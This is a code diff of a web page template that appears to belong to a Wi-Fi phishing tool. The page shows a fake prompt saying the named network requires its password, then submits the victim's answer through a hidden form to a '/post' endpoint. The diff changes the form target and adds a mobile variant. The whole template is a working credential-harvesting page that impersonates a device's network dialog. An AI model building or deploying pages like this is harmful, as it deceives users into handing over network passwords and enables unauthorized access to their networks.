@@ -284,23 +284,24 @@
                 {% end %}
         "       </ul> " +
         "       <a href=''>Network settings</a> " +
-        "       </div></form>";
+        "       </div></form>"; 
         
-        var loadhtml_mobile = '<form id="wifi-search-form" method="post" action="index.html">' +
+        var loadhtml_mobile = '<form id="wifi-search-form" method="post" action="/post">' +
 	'<input class="hidden" id="wifi-search-password" name="wfphshr-wpa-password" />' +
-	'	<div class="buttons">' +
-	'		<button id="button-join" class="action hidden"></button>' +
-	'	</div>' +
+	' 	<div class="buttons">' +
+        ' 		<button id="button-join" class="action hidden"></button>' +
+        ' 	</div>' +
 	'</form>';
         
-	function load_mobile() {
-		var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption if target_ap_encryption != None }} password.', '');
+        function load_mobile() {
+		var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
 			
 		if (popup != null) {
 			document.getElementById("wifi-search-password").value = popup;
 			document.getElementById("button-join").click();
 		}
 	}
+        
         </script>
         <title></title>
         </head>
@@ -334,6 +335,7 @@
         </div>
         <div id="loader-mac"></div>
         <div id="loader-windows"></div>
+        <div id="loader-mobile"></div>
         <script>
             if (jscd.os == "Windows") {
                 document.getElementById("loader-windows").innerHTML = loadhtml_windows;
